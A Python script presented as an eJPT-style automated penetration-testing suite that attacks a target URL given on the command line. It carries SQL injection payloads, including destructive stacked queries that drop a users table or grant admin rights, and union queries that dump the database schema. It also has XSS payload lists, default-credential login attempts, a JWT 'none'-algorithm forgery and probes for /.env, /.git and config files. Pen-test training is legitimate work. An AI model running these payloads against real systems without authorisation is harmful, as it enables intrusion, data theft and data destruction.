#!/usr/bin/env python3
# ==============================================================================
# Automated Penetration Testing & Vulnerability Exploitation Script (eJPT)
# ==============================================================================
# Purpose: Automate common penetration testing tasks:
#   - SQL Injection detection and exploitation
#   - Cross-Site Scripting (XSS) hunting
#   - Insecure Direct Object References (IDOR)
#   - Authentication bypass techniques
#   - API endpoint fuzzing
#   - Web server enumeration
# ==============================================================================

import requests
import argparse
import json
import re
import time
from urllib.parse import urljoin, quote
from typing import List, Dict, Tuple
import subprocess
import logging
from datetime import datetime

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(f'pen_test_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==============================================================================
# CLASS 1: SQL INJECTION DETECTION & EXPLOITATION
# ==============================================================================

class SQLInjectionTester:
    """
    Automated SQL Injection vulnerability discovery and exploitation
    Demonstrates eJPT-level SQL injection (union-based, blind, time-based)
    """
    
    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url
        self.timeout = timeout
        self.session = requests.Session()
        self.vulnerable_endpoints = []
        self.payload_tests = {
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
            ],
            'blind_based': [
                "' AND '1'='1",
                "' AND '1'='2",
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
            ],
            'time_based': [
                "' UNION SELECT SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "'; WAITFOR DELAY '00:00:05'--",
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; UPDATE users SET admin=1--",
                "'; EXEC sp_executesql--",
            ]
        }

    def test_parameter(self, url: str, param_name: str, param_value: str) -> Dict:
        """Test a single parameter for SQL injection vulnerability"""
        
        results = {
            'vulnerable': False,
            'payload_type': None,
            'payload': None,
            'response_time': None
        }

        # Test 1: Union-based SQL injection
        for payload in self.payload_tests['union_based']:
            test_params = {param_name: param_value + payload}
            try:
                start = time.time()
                response = self.session.get(url, params=test_params, timeout=self.timeout)
                elapsed = time.time() - start
                
                # Check for SQL error patterns in response
                if self._check_sql_error(response.text):
                    logger.warning(f"[SQL INJECTION] Union-based detected at {url}, param: {param_name}")
                    results['vulnerable'] = True
                    results['payload_type'] = 'union_based'
                    results['payload'] = payload
                    return results
            except requests.Timeout:
                logger.info(f"Request timeout for {url} - possible time-based SQL injection")

        # Test 2: Time-based blind SQL injection
        for payload in self.payload_tests['time_based']:
            test_params = {param_name: param_value + payload}
            try:
                start = time.time()
                response = self.session.get(url, params=test_params, timeout=self.timeout)
                elapsed = time.time() - start
                
                if elapsed > 5:  # Detect if database slept for 5 seconds
                    logger.warning(f"[SQL INJECTION] Time-based detected at {url}, param: {param_name}")
                    results['vulnerable'] = True
                    results['payload_type'] = 'time_based'
                    results['payload'] = payload
                    results['response_time'] = elapsed
                    return results
            except requests.Timeout:
                pass

        return results

    def _check_sql_error(self, response_text: str) -> bool:
        """Check if response contains SQL error messages"""
        sql_errors = [
            r"MySQL\s+syntax",
            r"SQL\s+Server\s+error",
            r"PostgreSQL\s+error",
            r"ORA-\d+",  # Oracle error
            r"ODBC\s+error",
            r"Database\s+connection\s+failed",
            r"SQLState",
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def exploit_union_based(self, url: str, param_name: str, base_payload: str) -> Dict:
        """Exploit union-based SQL injection to extract database info"""
        
        # Craft payload to extract database version/user
        payloads = {
            'mysql_version': base_payload + " UNION SELECT version(),user(),database(),4--",
            'mysql_tables': base_payload + " UNION SELECT table_name,2,3,4 FROM information_schema.tables--",
            'table_columns': base_payload + " UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='users'--",
        }
        
        results = {}
        for exploit_type, payload in payloads.items():
            try:
                response = self.session.get(url, params={param_name: payload}, timeout=self.timeout)
                # Parse database information from response
                # (This would be specific to the application)
                results[exploit_type] = {
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'payload': payload
                }
                logger.info(f"[EXPLOIT] Executed {exploit_type}: {payload}")
            except Exception as e:
                logger.error(f"Exploitation failed: {e}")
        
        return results


# ==============================================================================
# CLASS 2: CROSS-SITE SCRIPTING (XSS) DETECTION
# ==============================================================================

class XSSTester:
    """Automated XSS vulnerability detection (reflected, stored, DOM-based)"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.xss_payloads = {
            'reflected': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "javascript:alert('XSS')",
            ],
            'event_handlers': [
                "<div onclick=alert('XSS')>Click me</div>",
                "<textarea autofocus onfocus=alert('XSS')></textarea>",
                "<keygen onfocus=alert('XSS') autofocus>",
            ],
            'svg_based': [
                "<svg/onload=alert('XSS')>",
                "<svg><script>alert('XSS')</script></svg>",
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            ],
        }

    def test_parameter(self, param_name: str, param_value: str) -> Dict:
        """Test parameter for XSS vulnerability"""
        
        results = {'vulnerable': False, 'payload_type': None, 'payloads': []}
        
        for payload_type, payloads in self.xss_payloads.items():
            for payload in payloads:
                test_params = {param_name: param_value + payload}
                try:
                    response = self.session.get(self.target_url, params=test_params, timeout=10)
                    
                    # Check if payload is reflected in response (without encoding)
                    if payload in response.text:
                        logger.warning(f"[XSS REFLECTED] Payload: {payload}")
                        results['vulnerable'] = True
                        results['payload_type'] = payload_type
                        results['payloads'].append(payload)
                except Exception as e:
                    logger.error(f"XSS test failed: {e}")
        
        return results


# ==============================================================================
# CLASS 3: AUTHENTICATION BYPASS DETECTION
# ==============================================================================

class AuthenticationBypassTester:
    """Detect authentication bypass vulnerabilities"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def test_default_credentials(self, username_param: str, password_param: str) -> List[Dict]:
        """Test for default/weak credentials"""
        
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('test', 'test'),
            ('user', 'password'),
            ('guest', 'guest'),
        ]
        
        valid_creds = []
        
        for username, password in default_creds:
            try:
                response = self.session.post(
                    self.target_url,
                    data={
                        username_param: username,
                        password_param: password
                    },
                    timeout=10,
                    allow_redirects=False
                )
                
                # Check for successful login indicators
                if response.status_code == 302 or 'dashboard' in response.text.lower():
                    logger.critical(f"[AUTH BYPASS] Default credentials work: {username}:{password}")
                    valid_creds.append({
                        'username': username,
                        'password': password,
                        'status_code': response.status_code
                    })
            except Exception as e:
                pass
        
        return valid_creds

    def test_jwt_vulnerabilities(self, jwt_token: str) -> Dict:
        """Test JWT token for common vulnerabilities"""
        
        results = {'vulnerabilities': []}
        
        # Test 1: Check if 'none' algorithm is accepted
        try:
            import jwt
            # Decode without verification
            decoded = jwt.decode(jwt_token, options={"verify_signature": False})
            
            # Try to create a token with 'none' algorithm
            none_token = jwt.encode({'user': 'admin'}, '', algorithm='none')
            logger.warning(f"[JWT] 'none' algorithm may be accepted")
            results['vulnerabilities'].append('none_algorithm_accepted')
        except Exception as e:
            pass
        
        return results


# ==============================================================================
# CLASS 4: API ENDPOINT FUZZING
# ==============================================================================

class APIFuzzer:
    """Fuzzing for hidden API endpoints and parameters"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.common_endpoints = [
            '/api/users', '/api/admin', '/api/config', '/api/settings',
            '/api/backup', '/api/database', '/api/export',
            '/admin/users', '/admin/config', '/internal/data',
            '/.git', '/.env', '/config.php', '/web.config',
        ]

    def discover_endpoints(self) -> Dict:
        """Attempt to discover hidden endpoints"""
        
        discovered = {'found': [], 'interesting': []}
        
        for endpoint in self.common_endpoints:
            try:
                response = self.session.get(urljoin(self.target_url, endpoint), timeout=5)
                
                # 200 = found, 403 = forbidden (interesting), 401 = requires auth
                if response.status_code in [200, 401, 403]:
                    logger.info(f"[ENDPOINT DISCOVERED] {endpoint} - Status: {response.status_code}")
                    discovered['found'].append(endpoint)
                    
                    if response.status_code == 403:
                        discovered['interesting'].append(endpoint)
            except requests.Timeout:
                pass
            except Exception as e:
                pass
        
        return discovered


# ==============================================================================
# CLASS 5: WEB SERVER ENUMERATION
# ==============================================================================

class WebServerEnumerator:
    """Enumerate server information and misconfigurations"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def enumerate(self) -> Dict:
        """Gather server fingerprinting information"""
        
        info = {
            'server_header': None,
            'powered_by': None,
            'technologies': [],
            'headers': {},
            'cookies': [],
        }
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            
            # Extract sensitive headers
            sensitive_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Runtime']
            for header in sensitive_headers:
                if header in response.headers:
                    value = response.headers[header]
                    logger.warning(f"[INFO DISCLOSURE] {header}: {value}")
                    if header == 'Server':
                        info['server_header'] = value
                    elif header == 'X-Powered-By':
                        info['powered_by'] = value

            # Extract cookies
            info['cookies'] = list(response.cookies)
            
            # Detect CMS via content analysis
            tech_patterns = {
                'WordPress': r'wp-content|wp-includes',
                'Drupal': r'sites/default',
                'Joomla': r'components/com_',
                'Magento': r'skin/frontend|media/wysiwyg',
            }
            
            for tech, pattern in tech_patterns.items():
                if re.search(pattern, response.text):
                    info['technologies'].append(tech)
                    logger.warning(f"[CMS DETECTED] {tech}")
            
            info['headers'] = dict(response.headers)
        
        except Exception as e:
            logger.error(f"Enumeration failed: {e}")
        
        return info


# ==============================================================================
# MAIN ORCHESTRATION
# ==============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='Automated Penetration Testing Suite (eJPT Coverage)'
    )
    parser.add_argument('target', help='Target URL (e.g., http://vulnerable-app.com)')
    parser.add_argument('--sqli', action='store_true', help='Test for SQL injection')
    parser.add_argument('--xss', action='store_true', help='Test for XSS')
    parser.add_argument('--auth', action='store_true', help='Test authentication bypass')
    parser.add_argument('--enum', action='store_true', help='Enumerate target')
    parser.add_argument('--fuzz', action='store_true', help='Fuzz API endpoints')
    parser.add_argument('--all', action='store_true', help='Run all tests')
    parser.add_argument('--param', default='id', help='Parameter to test (default: id)')
    
    args = parser.parse_args()

    logger.info(f"Starting penetration test against: {args.target}")

    report = {
        'timestamp': datetime.now().isoformat(),
        'target': args.target,
        'vulnerabilities': [],
    }

    # SQL Injection Testing
    if args.sqli or args.all:
        logger.info("Testing for SQL Injection...")
        sqli = SQLInjectionTester(args.target)
        result = sqli.test_parameter(args.target, args.param, 'test')
        if result['vulnerable']:
            report['vulnerabilities'].append(result)

    # XSS Testing
    if args.xss or args.all:
        logger.info("Testing for XSS...")
        xss = XSSTester(args.target)
        result = xss.test_parameter(args.param, 'test')
        if result['vulnerable']:
            report['vulnerabilities'].append(result)

    # Authentication Bypass
    if args.auth or args.all:
        logger.info("Testing authentication bypass...")
        auth = AuthenticationBypassTester(args.target)
        results = auth.test_default_credentials('username', 'password')
        if results:
            report['vulnerabilities'].extend(results)

    # Web Server Enumeration
    if args.enum or args.all:
        logger.info("Enumerating target...")
        enum = WebServerEnumerator(args.target)
        info = enum.enumerate()
        report['enumeration'] = info

    # API Endpoint Fuzzing
    if args.fuzz or args.all:
        logger.info("Fuzzing API endpoints...")
        fuzzer = APIFuzzer(args.target)
        endpoints = fuzzer.discover_endpoints()
        report['endpoints'] = endpoints

    # Generate report
    logger.info(f"Found {len(report['vulnerabilities'])} vulnerabilities")
    
    report_file = f"pen_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=2)
    
    logger.info(f"Report saved to: {report_file}")
    print(json.dumps(report, indent=2))


if __name__ == '__main__':
    main()
